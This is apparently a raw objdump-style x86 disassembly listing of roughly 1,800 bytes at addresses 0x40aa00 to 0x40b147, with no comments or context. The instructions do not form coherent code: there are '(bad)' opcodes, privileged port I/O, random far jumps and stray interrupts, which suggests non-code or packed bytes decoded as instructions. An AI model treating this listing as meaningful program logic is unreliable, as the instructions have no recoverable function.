  40aa00:	mov    cl,0xf6
  40aa02:	in     al,0x48
  40aa04:	jecxz  0x40a9d4
  40aa06:	jne    0x40aa48
  40aa08:	lea    esp,[ebp-0x46]
  40aa0b:	sub    ch,ch
  40aa0d:	out    dx,eax
  40aa0e:	adc    esi,DWORD PTR [ebx]
  40aa10:	dec    edx
  40aa11:	scas   eax,DWORD PTR es:[edi]
  40aa12:	and    DWORD PTR [ebp+0xc],ebp
  40aa15:	mov    ds:0x98cc54ff,al
  40aa1a:	(bad)  
  40aa1b:	push   ebx
  40aa1c:	out    0xbd,al
  40aa1e:	sbb    ebx,eax
  40aa20:	mov    ebx,0xab933cec
  40aa25:	(bad)  
  40aa26:	mov    bh,0xe0
  40aa28:	jns    0x40aa86
  40aa2a:	lods   eax,DWORD PTR ds:[esi]
  40aa2b:	add    eax,0xb5a2eca5
  40aa30:	sbb    BYTE PTR ds:0x55c484e1,ch
  40aa36:	nop
  40aa37:	fsub   DWORD PTR [ebp+0x3a7e783a]
  40aa3d:	outs   dx,DWORD PTR ds:[esi]
  40aa3e:	mov    dl,bl
  40aa40:	mov    esp,0x5434f5cd
  40aa45:	mov    ebx,0x53219030
  40aa4a:	and    eax,0x5602c5
  40aa4f:	cs jns 0x40aab0
  40aa52:	mov    cl,0x92
  40aa54:	xchg   esp,eax
  40aa55:	xor    DWORD PTR [esi+0x6ea9c2bf],ebp
  40aa5b:	das    
  40aa5c:	add    BYTE PTR [eax],bl
  40aa5e:	ret    
  40aa5f:	dec    ebx
  40aa60:	mov    dh,0xdb
  40aa62:	sub    BYTE PTR [esi],ah
  40aa64:	and    eax,0x11de780b
  40aa69:	je     0x40aa4e
  40aa6b:	push   ebp
  40aa6c:	ror    BYTE PTR [esi],cl
  40aa6e:	call   FWORD PTR [edx-0x38256273]
  40aa74:	push   cs
  40aa75:	jnp    0x40aab6
  40aa77:	retf   0xdd64
  40aa7a:	iret   
  40aa7b:	jge    0x40aa70
  40aa7d:	inc    esi
  40aa7e:	pop    edi
  40aa7f:	jl     0x40aa64
  40aa81:	add    al,0xb3
  40aa83:	add    DWORD PTR [eax+0x2d],esp
  40aa86:	pop    ebp
  40aa87:	rcl    DWORD PTR [esi+0x17],1
  40aa8a:	pop    edx
  40aa8b:	in     eax,dx
  40aa8c:	jecxz  0x40aacd
  40aa8e:	mov    eax,ds:0x60623b13
  40aa93:	enter  0xc41e,0x7a
  40aa97:	sbb    DWORD PTR [eax-0x22],edx
  40aa9a:	inc    eax
  40aa9b:	aam    0x33
  40aa9d:	sub    edi,DWORD PTR [ebx-0x1ea9e001]
  40aaa3:	cmc    
  40aaa4:	jae    0x40aa41
  40aaa6:	and    al,BYTE PTR [eax]
  40aaa8:	out    0x73,al
  40aaaa:	and    DWORD PTR [esi+0x5],ecx
  40aaad:	je     0x40aa8d
  40aaaf:	lods   al,BYTE PTR ds:[esi]
  40aab0:	push   ebp
  40aab1:	rcr    BYTE PTR [ebp+0x5e],cl
  40aab4:	sbb    eax,0xb60dea9b
  40aab9:	jmp    0x74881653
  40aabe:	cmp    eax,0x35816829
  40aac3:	jmp    edi
  40aac5:	clc    
  40aac6:	ret    
  40aac7:	fucomip st,st(0)
  40aac9:	push   edi
  40aaca:	mov    dl,0x10
  40aacc:	mov    ecx,0x32e8afc5
  40aad1:	mov    al,0xc8
  40aad3:	push   cs
  40aad4:	sub    BYTE PTR [edx],bh
  40aad6:	pop    ebp
  40aad7:	add    esp,DWORD PTR cs:[ecx+0x2546ab36]
  40aade:	mov    al,ds:0xc2f03c10
  40aae3:	scas   al,BYTE PTR es:[edi]
  40aae4:	adc    bl,bl
  40aae6:	outs   dx,DWORD PTR ds:[esi]
  40aae7:	xchg   ebp,eax
  40aae8:	mov    ah,dl
  40aaea:	and    cl,BYTE PTR [eax+edx*4]
  40aaed:	add    BYTE PTR [ebx],ah
  40aaef:	jnp    0x40aa79
  40aaf1:	pop    ebp
  40aaf2:	mov    DWORD PTR [eax],ebp
  40aaf4:	cdq    
  40aaf5:	retf   0x6214
  40aaf8:	fisttp QWORD PTR [edx]
  40aafa:	sbb    ebp,DWORD PTR [ecx+ebp*8+0x74]
  40aafe:	add    BYTE PTR [edi],ah
  40ab00:	out    0x28,eax
  40ab02:	pop    ecx
  40ab03:	int    0xbe
  40ab05:	xor    eax,0x5714f5d7
  40ab0a:	push   eax
  40ab0b:	inc    ebx
  40ab0c:	dec    eax
  40ab0d:	dec    ebp
  40ab0e:	mov    bh,0x70
  40ab10:	loopne 0x40aac9
  40ab12:	jge    0x40ab88
  40ab14:	cs mov dh,0x96
  40ab17:	mov    edx,0x2ac2120d
  40ab1c:	fs pop ecx
  40ab1e:	add    cl,ch
  40ab20:	pop    es
  40ab21:	call   0x7bb97a45
  40ab26:	sub    cl,BYTE PTR [edx]
  40ab28:	push   cs
  40ab29:	fwait
  40ab2a:	inc    eax
  40ab2b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab2e:	xlat   BYTE PTR ds:[ebx]
  40ab2f:	or     eax,0xd6bb5485
  40ab34:	inc    esp
  40ab35:	ins    DWORD PTR es:[edi],dx
  40ab36:	and    al,0x2
  40ab38:	cmp    eax,0xd40bfca0
  40ab3d:	adc    ebp,DWORD PTR [ebx]
  40ab3f:	or     esp,DWORD PTR [eax-0x65]
  40ab42:	inc    ebp
  40ab43:	lods   al,BYTE PTR ds:[esi]
  40ab44:	sbb    edx,DWORD PTR [edx+0x69790fa6]
  40ab4a:	call   0xde67bf72
  40ab4f:	mov    ah,0x59
  40ab51:	rcl    DWORD PTR [ebp-0x37a53a01],1
  40ab57:	clc    
  40ab58:	pop    eax
  40ab59:	loop   0x40abb5
  40ab5b:	test   DWORD PTR [ecx],esi
  40ab5d:	pop    es
  40ab5e:	pop    esp
  40ab5f:	add    al,0x95
  40ab61:	stos   DWORD PTR es:[edi],eax
  40ab62:	mov    dl,0x99
  40ab64:	push   ebp
  40ab65:	int3   
  40ab66:	cmp    eax,0x675c4abe
  40ab6b:	stos   DWORD PTR es:[edi],eax
  40ab6c:	cmp    eax,0xe4b772b7
  40ab71:	mov    cl,BYTE PTR [ebp+0x347acda0]
  40ab77:	loopne 0x40abbb
  40ab79:	cmc    
  40ab7a:	xchg   ecx,eax
  40ab7b:	mov    ch,0xbd
  40ab7d:	sti    
  40ab7e:	imul   esi,esp,0xffffffc0
  40ab81:	xchg   edi,eax
  40ab82:	xlat   BYTE PTR ds:[ebx]
  40ab83:	fiadd  WORD PTR [ebx+0x4f]
  40ab86:	mov    esi,0xb649eeb8
  40ab8b:	cmp    esp,DWORD PTR [eax+0x6c]
  40ab8e:	ror    DWORD PTR [ebp+0x23],0xca
  40ab92:	stos   BYTE PTR es:[edi],al
  40ab93:	movzx  edx,WORD PTR [edx+edi*1+0x74]
  40ab98:	inc    esp
  40ab99:	test   DWORD PTR [ebx+0x43],ebp
  40ab9c:	out    dx,al
  40ab9d:	mov    dl,0x6b
  40ab9f:	out    dx,al
  40aba0:	repz jmp 0x3a48:0x58f8c665
  40aba8:	ins    DWORD PTR es:[edi],dx
  40aba9:	xchg   edi,eax
  40abaa:	loop   0x40abab
  40abac:	ins    DWORD PTR es:[edi],dx
  40abad:	adc    bl,BYTE PTR [edx]
  40abaf:	(bad)  
  40abb0:	cwde   
  40abb1:	leave  
  40abb2:	cmp    dh,cl
  40abb4:	adc    al,0x9
  40abb6:	mov    al,ds:0xb8a1eaf
  40abbb:	sub    BYTE PTR [ebp+0x3c],al
  40abbe:	mov    cl,0xa5
  40abc0:	xchg   ebp,eax
  40abc1:	faddp  st(7),st
  40abc3:	mov    ss,WORD PTR [edx-0x27fe7d32]
  40abc9:	pop    esp
  40abca:	or     eax,0xe815aa9d
  40abcf:	adc    ah,BYTE PTR [edx]
  40abd1:	fdiv   DWORD PTR [esi-0x4a6688b4]
  40abd7:	pop    esp
  40abd8:	xor    BYTE PTR [edx-0xb],al
  40abdb:	mov    esi,DWORD PTR [edx]
  40abdd:	test   al,0x4f
  40abdf:	mov    DWORD PTR [eax],eax
  40abe1:	ret    
  40abe2:	rol    DWORD PTR [eax+0x62654792],1
  40abe8:	jae    0x40ac09
  40abea:	push   ecx
  40abeb:	sub    esi,DWORD PTR [edx-0x3b]
  40abee:	retf   0xaf81
  40abf1:	loopne 0x40ac5e
  40abf3:	popf   
  40abf4:	mov    ah,0x1f
  40abf6:	or     ah,cl
  40abf8:	or     al,0xde
  40abfa:	sub    al,0xc8
  40abfc:	shl    bl,1
  40abfe:	outs   dx,BYTE PTR ds:[esi]
  40abff:	mov    esi,0xfbd03fdb
  40ac04:	mov    edi,0xb3040337
  40ac09:	fdivr  QWORD PTR ds:0x17fa4432
  40ac0f:	mov    dh,0x96
  40ac11:	and    ch,BYTE PTR [edi]
  40ac13:	add    esi,DWORD PTR ds:0xebb89d02
  40ac19:	and    al,0x34
  40ac1b:	fsubr  DWORD PTR [edx+0x2414c5d]
  40ac21:	loop   0x40abe7
  40ac23:	and    eax,0x9e74765b
  40ac28:	mov    ds:0xc939dbca,al
  40ac2d:	aad    0x9e
  40ac2f:	push   esp
  40ac30:	xchg   esi,eax
  40ac31:	js     0x40ac28
  40ac33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac34:	sbb    edi,eax
  40ac36:	test   DWORD PTR [edi+0x5d],0xc7bd50bc
  40ac3d:	jl     0x40aca1
  40ac3f:	mov    esi,0x7fbf4289
  40ac44:	out    0xc8,al
  40ac46:	push   ds
  40ac47:	int    0xbf
  40ac49:	out    dx,al
  40ac4a:	ins    DWORD PTR es:[edi],dx
  40ac4b:	pop    es
  40ac4c:	rcr    DWORD PTR [edi+0xda4021a],cl
  40ac52:	ins    BYTE PTR es:[edi],dx
  40ac53:	mov    eax,0x9091a863
  40ac58:	les    edx,FWORD PTR [ebp-0x4325e540]
  40ac5e:	aam    0xee
  40ac60:	rcl    BYTE PTR [esi],1
  40ac62:	xor    BYTE PTR [eax-0x3b],bl
  40ac65:	clc    
  40ac66:	mov    ebp,0x980f01cf
  40ac6b:	lods   eax,DWORD PTR ds:[esi]
  40ac6c:	test   eax,0x1ccf66f3
  40ac71:	mov    ecx,0xc4312ecd
  40ac76:	jl     0x40ac2d
  40ac78:	or     DWORD PTR gs:[ebp+0x4836f1a],0xc4f73d5d
  40ac83:	enter  0x4532,0x14
  40ac87:	pop    ecx
  40ac88:	das    
  40ac89:	jbe    0x40ac49
  40ac8b:	js     0x40ac8f
  40ac8d:	xchg   edi,eax
  40ac8e:	shl    BYTE PTR [ebx+0x45],cl
  40ac91:	out    dx,eax
  40ac92:	outs   dx,BYTE PTR ds:[esi]
  40ac93:	mov    BYTE PTR [ebx+0x42],bl
  40ac96:	push   ecx
  40ac97:	js     0x40ac24
  40ac99:	inc    edi
  40ac9a:	mov    ch,0xba
  40ac9c:	xor    BYTE PTR [eax+ebx*2+0x67],al
  40aca0:	std    
  40aca1:	out    0xf,al
  40aca3:	pop    ebp
  40aca4:	add    eax,0x99adb00
  40aca9:	lods   al,BYTE PTR ds:[esi]
  40acaa:	push   cs
  40acab:	dec    esp
  40acac:	add    DWORD PTR [esi-0x16],ebx
  40acaf:	push   ds
  40acb0:	mov    eax,0xf49ad185
  40acb5:	ins    DWORD PTR es:[edi],dx
  40acb6:	lock sub BYTE PTR [edi+0x63],0x4c
  40acbb:	xchg   cl,ah
  40acbd:	fwait
  40acbe:	cmp    eax,0x5e4007b8
  40acc3:	dec    eax
  40acc4:	in     eax,dx
  40acc5:	(bad)  
  40acc6:	xlat   BYTE PTR gs:[ebx]
  40acc8:	rol    DWORD PTR [eax-0x26],1
  40accb:	je     0x40acd6
  40accd:	push   eax
  40acce:	iret   
  40accf:	scas   eax,DWORD PTR es:[edi]
  40acd0:	jae    0x40ad03
  40acd2:	jl     0x40ac93
  40acd4:	jns    0x40acbc
  40acd6:	and    BYTE PTR [esi+0x29],dl
  40acd9:	inc    eax
  40acda:	into   
  40acdb:	ins    DWORD PTR es:[edi],dx
  40acdc:	rcl    DWORD PTR [ebp-0x5e],0x75
  40ace0:	jns    0x40acdc
  40ace2:	push   esi
  40ace3:	mov    gs,WORD PTR [ecx+0x37]
  40ace6:	jp     0x40ac70
  40ace8:	push   ebp
  40ace9:	jb     0x40acfe
  40aceb:	or     ebp,DWORD PTR [esi-0x3b53ef5]
  40acf1:	xchg   esp,eax
  40acf2:	mov    ebx,0x316b8b7b
  40acf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acf8:	mov    ebx,0xf534976e
  40acfd:	lods   eax,DWORD PTR ds:[esi]
  40acfe:	adc    eax,0x79ba4be0
  40ad03:	jae    0x40ad50
  40ad05:	ret    0x953c
  40ad08:	cs mov esi,0x2251a003
  40ad0e:	sub    ecx,DWORD PTR [ebp-0x649e87a4]
  40ad14:	pop    ss
  40ad15:	in     al,0xee
  40ad17:	adc    bh,0xdf
  40ad1a:	out    dx,eax
  40ad1b:	in     al,0xa0
  40ad1d:	daa    
  40ad1e:	sahf   
  40ad1f:	retf   
  40ad20:	(bad)  
  40ad21:	cmp    dh,BYTE PTR [ebx+0x3a240cfb]
  40ad27:	push   ebp
  40ad28:	xchg   esi,eax
  40ad29:	call   0x70581730
  40ad2e:	popf   
  40ad2f:	xchg   edx,eax
  40ad30:	lods   al,BYTE PTR ds:[esi]
  40ad31:	scas   al,BYTE PTR es:[edi]
  40ad32:	or     DWORD PTR [esi],esp
  40ad34:	mov    ch,0x21
  40ad36:	xor    eax,0x831a2fe2
  40ad3b:	xlat   BYTE PTR ds:[ebx]
  40ad3c:	jge    0x40ad5f
  40ad3e:	inc    ecx
  40ad3f:	outs   dx,BYTE PTR ds:[esi]
  40ad40:	push   esi
  40ad41:	fidivr WORD PTR [eax*2+0x7f486e0]
  40ad48:	push   ebp
  40ad49:	cwde   
  40ad4a:	jmp    0x40adc9
  40ad4c:	sbb    eax,0xaba1302d
  40ad51:	mov    eax,0x1ff256bf
  40ad56:	jp     0x40ad93
  40ad58:	add    DWORD PTR [edi],esp
  40ad5a:	jge    0x40ad00
  40ad5c:	and    ch,BYTE PTR [ecx]
  40ad5e:	lea    edi,[esi-0x20cf9f9d]
  40ad64:	pop    edi
  40ad65:	mov    ebp,0xca6424d4
  40ad6a:	retf   
  40ad6b:	mov    dl,0xd2
  40ad6d:	push   ds
  40ad6e:	xor    DWORD PTR [eax-0x6036fc18],edi
  40ad74:	xchg   edi,eax
  40ad75:	jae    0x40ad52
  40ad77:	stc    
  40ad78:	hlt    
  40ad79:	mov    ?,WORD PTR [esi+0x235b670e]
  40ad7f:	fnsave [edi+0x57ec21d]
  40ad85:	dec    esi
  40ad86:	dec    esp
  40ad87:	rcl    DWORD PTR ds:0xc53116e,0x0
  40ad8e:	push   0x6092ee2e
  40ad93:	pop    ss
  40ad94:	jp     0x40ad1e
  40ad96:	xchg   dh,ch
  40ad98:	jge    0x40adf9
  40ad9a:	pop    es
  40ad9b:	je     0x40add6
  40ad9d:	ret    
  40ad9e:	lds    ebx,FWORD PTR [edx]
  40ada0:	jne    0x40adb7
  40ada2:	inc    esi
  40ada3:	sub    DWORD PTR [esi-0x1212ec75],0x3a86d627
  40adad:	cmp    ebp,ecx
  40adaf:	push   cs
  40adb0:	hlt    
  40adb1:	(bad)  
  40adb2:	lods   eax,DWORD PTR ds:[esi]
  40adb3:	xor    ah,0xbd
  40adb6:	shr    DWORD PTR [edx+0x6d],cl
  40adb9:	mov    bh,0x85
  40adbb:	add    bh,cl
  40adbd:	shl    DWORD PTR [ebx],1
  40adbf:	loop   0x40add9
  40adc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adc2:	jo     0x40addf
  40adc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adc5:	and    BYTE PTR [edx-0x3d],al
  40adc8:	sub    al,bh
  40adca:	xchg   esi,eax
  40adcb:	idiv   cl
  40adcd:	xchg   BYTE PTR [edi],bh
  40adcf:	stos   DWORD PTR es:[edi],eax
  40add0:	xchg   al,ah
  40add2:	or     esi,DWORD PTR gs:[edi-0x1b]
  40add6:	mov    ah,BYTE PTR [esi]
  40add8:	mov    dh,0x57
  40adda:	stc    
  40addb:	dec    ebp
  40addc:	mov    esi,fs
  40adde:	jo     0x40adb9
  40ade0:	fbstp  TBYTE PTR [edi-0x7e]
  40ade3:	aaa    
  40ade4:	addr16 and eax,0xd9fa2e3e
  40adea:	jmp    0x40ad6c
  40adec:	jne    0x40ad75
  40adee:	or     esi,edi
  40adf0:	sub    DWORD PTR [esi-0x4c67d4],0xffffffb6
  40adf7:	outs   dx,DWORD PTR ds:[esi]
  40adf8:	push   ds
  40adf9:	(bad)  
  40adfa:	jb     0x40ae73
  40adfc:	retf   0x3020
  40adff:	(bad)  
  40ae00:	push   ds
  40ae01:	lds    esp,FWORD PTR [eax-0x76]
  40ae04:	jmp    0xf9c0:0xad0ac1fa
  40ae0b:	sbb    al,0x7b
  40ae0d:	shl    DWORD PTR [esi],0x39
  40ae10:	lahf   
  40ae11:	aad    0x72
  40ae13:	test   ecx,0x5d4275
  40ae19:	das    
  40ae1a:	(bad)  
  40ae1b:	jmp    DWORD PTR [ecx-0x66]
  40ae1e:	jmp    0x3e77:0xdb7c095e
  40ae25:	pop    esp
  40ae26:	(bad)  
  40ae27:	mov    edx,0x918c2bf1
  40ae2c:	sbb    BYTE PTR [ebp+eiz*4-0x4f],al
  40ae30:	mov    cs,WORD PTR [ebx+edx*8-0x5f]
  40ae34:	shl    BYTE PTR [edi],0x30
  40ae37:	add    al,0xf
  40ae39:	jle    0x40adff
  40ae3b:	int    0x2b
  40ae3d:	jle    0x40adcf
  40ae3f:	push   es
  40ae40:	dec    esi
  40ae41:	inc    edi
  40ae42:	or     BYTE PTR [esi],0xfa
  40ae45:	loop   0x40ae7d
  40ae47:	and    BYTE PTR [edi-0x6e],dl
  40ae4a:	out    dx,al
  40ae4b:	jbe    0x40ae6d
  40ae4d:	mul    BYTE PTR ds:[edx]
  40ae50:	add    al,0xbe
  40ae52:	fcomp  QWORD PTR [ebx]
  40ae54:	push   eax
  40ae55:	lea    esi,[eax-0x55461d02]
  40ae5b:	test   DWORD PTR [esp+edx*2+0x8],0x219ad5f9
  40ae63:	jns    0x40ae3e
  40ae65:	mul    DWORD PTR [esi+0x40]
  40ae68:	mov    ebp,0x9809491c
  40ae6d:	in     eax,0x8f
  40ae6f:	mov    ?,WORD PTR [edi+0x7196fa44]
  40ae75:	sahf   
  40ae76:	outs   dx,DWORD PTR ds:[esi]
  40ae77:	or     bl,BYTE PTR [edx-0x78]
  40ae7a:	xor    DWORD PTR [edx-0x52],ebp
  40ae7d:	mov    esp,edx
  40ae7f:	mov    ecx,0x278857c5
  40ae84:	xchg   esi,eax
  40ae85:	(bad)
  40ae88:	inc    edi
  40ae89:	test   bh,al
  40ae8b:	loop   0x40ae76
  40ae8d:	mov    eax,ds:0x9eae7d9b
  40ae92:	xchg   ebp,eax
  40ae93:	xchg   dl,cl
  40ae95:	mov    eax,ds:0x8a83b7cc
  40ae9a:	aad    0x9a
  40ae9c:	mov    ebp,0x94e7e1db
  40aea1:	fsubr  QWORD PTR [ecx-0x29]
  40aea4:	jp     0x40aefc
  40aea6:	fstp   TBYTE PTR [ecx-0x58]
  40aea9:	xchg   ecx,eax
  40aeaa:	dec    DWORD PTR [ebx]
  40aeac:	mov    ecx,0x6a72edf6
  40aeb1:	gs ja  0x40aed0
  40aeb4:	push   eax
  40aeb5:	xchg   ebx,eax
  40aeb6:	mov    eax,ds:0x6cdefcc4
  40aebb:	jnp    0x40ae54
  40aebd:	pop    ecx
  40aebe:	test   BYTE PTR [eax+edx*2+0x41],0xc3
  40aec3:	dec    ebp
  40aec4:	es sbb al,0x3a
  40aec7:	inc    cl
  40aec9:	and    eax,DWORD PTR [ebp-0x361e44c6]
  40aecf:	inc    esi
  40aed0:	adc    DWORD PTR [ebx+esi*8+0x27],ecx
  40aed4:	std    
  40aed5:	call   DWORD PTR [eax]
  40aed7:	push   esi
  40aed8:	mov    ch,0x51
  40aeda:	jge    0x40af0c
  40aedc:	or     eax,esi
  40aede:	cmp    ebp,eax
  40aee0:	aaa    
  40aee1:	cli    
  40aee2:	xor    eax,0xf81e1ee6
  40aee7:	jmp    0x40af37
  40aee9:	aad    0xfa
  40aeeb:	inc    eax
  40aeec:	hlt    
  40aeed:	aaa    
  40aeee:	test   eax,0x127c8b6c
  40aef3:	cld    
  40aef4:	cdq    
  40aef5:	addr16 aad 0x34
  40aef8:	xchg   esp,eax
  40aef9:	mov    ebx,0xd984c79f
  40aefe:	ja     0x40af1e
  40af00:	mov    DWORD PTR [eax],ebp
  40af02:	ret    0x1313
  40af05:	sbb    BYTE PTR [esp+edx*8+0x54fe7131],dl
  40af0c:	mov    ebp,0xae1a2b23
  40af11:	dec    ebx
  40af12:	mov    fs,WORD PTR [edx+esi*2-0x68]
  40af16:	pop    esi
  40af17:	iret   
  40af18:	pushf  
  40af19:	mov    ecx,0x7000008d
  40af1e:	push   esp
  40af1f:	add    eax,0xf2631558
  40af24:	ins    DWORD PTR es:[edi],dx
  40af25:	shl    ebp,cl
  40af27:	mov    ch,0x5c
  40af29:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40af2b:	push   es
  40af2c:	dec    ebp
  40af2d:	fstp   TBYTE PTR [edi-0x2e1697cd]
  40af33:	mov    ebp,0xaf42a1e1
  40af38:	or     al,0x9b
  40af3a:	dec    ecx
  40af3b:	add    esi,DWORD PTR [eax]
  40af3d:	js     0x40aefe
  40af3f:	clc    
  40af40:	ja     0x40aecf
  40af42:	sti    
  40af43:	lock dec edx
  40af45:	lods   al,BYTE PTR ds:[esi]
  40af46:	bound  eax,QWORD PTR ds:0x31982d5f
  40af4c:	es out 0xbe,eax
  40af4f:	jns    0x40af09
  40af51:	shl    BYTE PTR [edi+0x1f],1
  40af54:	enter  0x9fff,0x93
  40af58:	popa   
  40af59:	mov    eax,0x180569ce
  40af5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af5f:	rol    ebx,cl
  40af61:	jne    0x40af87
  40af63:	mov    cs,WORD PTR [ebp+0x1590f438]
  40af69:	imul   esi,DWORD PTR [ebx-0x16b4312a],0x33
  40af70:	pop    esi
  40af71:	in     al,0x8
  40af73:	cs cmp al,0xf4
  40af76:	addr16 pop es
  40af78:	mov    ebx,0x38fa88c1
  40af7d:	xlat   BYTE PTR ds:[ebx]
  40af7e:	mov    edi,0xe46a032b
  40af83:	or     bh,al
  40af85:	jg     0x40af54
  40af87:	dec    ecx
  40af88:	pop    ecx
  40af89:	add    al,0x8e
  40af8b:	shr    DWORD PTR [ebx-0x49],cl
  40af8e:	lods   eax,DWORD PTR ds:[esi]
  40af8f:	and    al,0x77
  40af91:	adc    al,0xad
  40af93:	add    al,0x72
  40af95:	cmp    esi,DWORD PTR [esi-0x3b]
  40af98:	outs   dx,BYTE PTR ds:[esi]
  40af99:	lods   al,BYTE PTR fs:[esi]
  40af9b:	mov    al,ss:0x9f5fe966
  40afa1:	div    BYTE PTR [ecx+0x7e]
  40afa4:	mov    BYTE PTR [ebp+0x50b55940],al
  40afaa:	sbb    DWORD PTR [edi+0x6fc89a85],ebx
  40afb0:	sbb    BYTE PTR [eax-0x38b89a94],0x1d
  40afb7:	ret    
  40afb8:	adc    eax,0xf66442a6
  40afbd:	push   0xfffffff5
  40afbf:	scas   al,BYTE PTR es:[edi]
  40afc0:	jmp    0x40afdd
  40afc2:	sbb    al,0x6d
  40afc4:	jb     0x40afa9
  40afc6:	in     al,0x40
  40afc8:	sbb    esi,esp
  40afca:	rcr    DWORD PTR [ecx+0xf],cl
  40afcd:	mov    bl,0x5d
  40afcf:	inc    edi
  40afd0:	aam    0x9
  40afd2:	push   ds
  40afd3:	fstp   QWORD PTR [edi]
  40afd5:	dec    eax
  40afd6:	mov    BYTE PTR [edi],dh
  40afd8:	fist   WORD PTR [ebx]
  40afda:	aaa    
  40afdb:	call   0xbcddc9de
  40afe0:	test   BYTE PTR [edx-0x47fb2abd],ah
  40afe6:	lods   al,BYTE PTR ds:[esi]
  40afe7:	pop    ebp
  40afe8:	outs   dx,DWORD PTR ds:[esi]
  40afe9:	xlat   BYTE PTR ds:[ebx]
  40afea:	rcr    BYTE PTR gs:[edi+0x30],0x90
  40afef:	sub    DWORD PTR [ebx+0xf8484eb],eax
  40aff5:	jb     0x40b074
  40aff7:	ins    BYTE PTR es:[edi],dx
  40aff8:	aam    0xf6
  40affa:	data16 mov di,0x5304
  40afff:	mov    DWORD PTR [eax-0x3cb04824],ebp
  40b005:	xor    BYTE PTR [ecx],0xf5
  40b008:	adc    al,0xc
  40b00a:	push   edx
  40b00b:	fist   WORD PTR [ebx+edi*8]
  40b00e:	outs   dx,BYTE PTR ds:[esi]
  40b010:	xchg   edi,eax
  40b011:	xchg   edx,eax
  40b012:	cmp    al,0xfb
  40b014:	adc    DWORD PTR [esi-0xb],ecx
  40b017:	xor    bh,dl
  40b019:	push   cs
  40b01a:	inc    ebx
  40b01b:	imul   BYTE PTR [esi+0x34]
  40b01e:	loop   0x40b07f
  40b020:	in     al,0xe8
  40b022:	fild   QWORD PTR [edi-0x5c]
  40b025:	pop    esp
  40b026:	mov    ebp,0x420b89dc
  40b02b:	(bad)  
  40b02d:	inc    ecx
  40b02e:	in     eax,dx
  40b02f:	xchg   DWORD PTR ds:0x35daaa4b,edx
  40b035:	scas   al,BYTE PTR es:[edi]
  40b036:	ss mov ch,0xe1
  40b039:	das    
  40b03a:	enter  0x51c4,0xca
  40b03e:	pop    ebp
  40b03f:	test   DWORD PTR [edi],0x41adf739
  40b045:	test   eax,0xdf15e9f0
  40b04a:	dec    ebx
  40b04b:	aam    0xce
  40b04d:	aad    0x1e
  40b04f:	sub    eax,0x9791d15b
  40b054:	fs in  eax,0xb8
  40b057:	mov    ch,0xb
  40b059:	dec    ecx
  40b05a:	bound  ebp,QWORD PTR [ebx+0x376d899a]
  40b060:	mov    ch,0x99
  40b062:	mov    WORD PTR ss:[esp+ebp*8+0x62],?
  40b067:	gs cmp al,0x63
  40b06a:	dec    edi
  40b06b:	dec    ebp
  40b06c:	add    al,0x51
  40b06e:	std    
  40b06f:	fwait
  40b070:	(bad)  
  40b071:	std    
  40b072:	pop    edi
  40b073:	jmp    0xc9e0c1a5
  40b078:	gs lahf 
  40b07a:	lahf   
  40b07b:	sbb    al,0xd
  40b07d:	sbb    eax,0x13310cde
  40b082:	mov    ch,0xc8
  40b084:	or     eax,0xd8fed013
  40b089:	ss mov gs,eax
  40b08c:	add    esp,DWORD PTR [ebp+0x1b]
  40b08f:	stos   BYTE PTR es:[edi],al
  40b090:	and    al,dl
  40b092:	sahf   
  40b093:	inc    esi
  40b094:	xor    DWORD PTR [eax+0x4b],0xfd643a24
  40b09b:	sbb    dl,BYTE PTR [esi+0x63]
  40b09e:	xchg   esi,eax
  40b09f:	inc    edi
  40b0a0:	pop    edi
  40b0a1:	inc    ebp
  40b0a2:	sub    bl,bh
  40b0a4:	cmp    eax,0xfa5e4d1d
  40b0a9:	enter  0x872c,0xfc
  40b0ad:	or     DWORD PTR [eax-0x32],ecx
  40b0b0:	mov    ebp,0x47b37fd6
  40b0b5:	mov    bl,0x47
  40b0b7:	popa   
  40b0b8:	int3   
  40b0b9:	test   esp,esp
  40b0bb:	jb     0x40b0f6
  40b0bd:	rcl    BYTE PTR ds:0x9cf39333,cl
  40b0c3:	or     eax,0xcdf0bdf1
  40b0c8:	in     eax,dx
  40b0c9:	cmp    BYTE PTR [edx-0xc],0xa1
  40b0cd:	pop    ebx
  40b0ce:	test   al,0xfa
  40b0d0:	push   esp
  40b0d1:	sahf   
  40b0d2:	lea    ebp,[ebx+0x678d3ad9]
  40b0d8:	rcr    BYTE PTR [ecx],1
  40b0da:	mov    cl,0xcb
  40b0dc:	jne    0x40b098
  40b0de:	jo     0x40b15a
  40b0e0:	jo     0x40b104
  40b0e2:	rol    BYTE PTR [eax],0x7f
  40b0e5:	test   DWORD PTR [ecx-0x49],edi
  40b0e8:	adc    DWORD PTR [edx],0x4de27cd6
  40b0ee:	push   eax
  40b0ef:	stos   BYTE PTR es:[edi],al
  40b0f0:	cs push ss
  40b0f2:	jne    0x40b077
  40b0f4:	add    al,0xc0
  40b0f6:	pop    es
  40b0f7:	mov    bl,BYTE PTR [edx]
  40b0f9:	fsub   st(0),st
  40b0fb:	in     al,dx
  40b0fc:	arpl   dx,si
  40b0fe:	cmp    ah,ah
  40b100:	mov    dl,0xf1
  40b102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b103:	cli    
  40b104:	jbe    0x40b0c7
  40b106:	mov    ecx,0x5ab61218
  40b10b:	add    eax,0xc934ce35
  40b110:	fisubr DWORD PTR [ecx+0x77]
  40b113:	pop    ds
  40b114:	cmp    eax,0x51175fde
  40b119:	daa    
  40b11a:	or     DWORD PTR [ebx+0x4910a7fc],edi
  40b120:	pop    ss
  40b121:	mov    ecx,0xeb9de4cd
  40b126:	ins    DWORD PTR es:[edi],dx
  40b127:	or     al,BYTE PTR [ebx]
  40b129:	push   0xffffffb1
  40b12b:	ret    
  40b12c:	mov    WORD PTR [esi+0x32],ss
  40b12f:	rcl    BYTE PTR [esi-0x621db35c],0xc
  40b136:	pop    DWORD PTR gs:[eax+0x4d]
  40b13a:	push   es
  40b13b:	fcomp  QWORD PTR [edi]
  40b13d:	mov    bl,0xda
  40b13f:	and    DWORD PTR [edi],edi
  40b141:	arpl   WORD PTR [esi-0x3336dfe5],si
  40b147:	xchg   ebx,eax
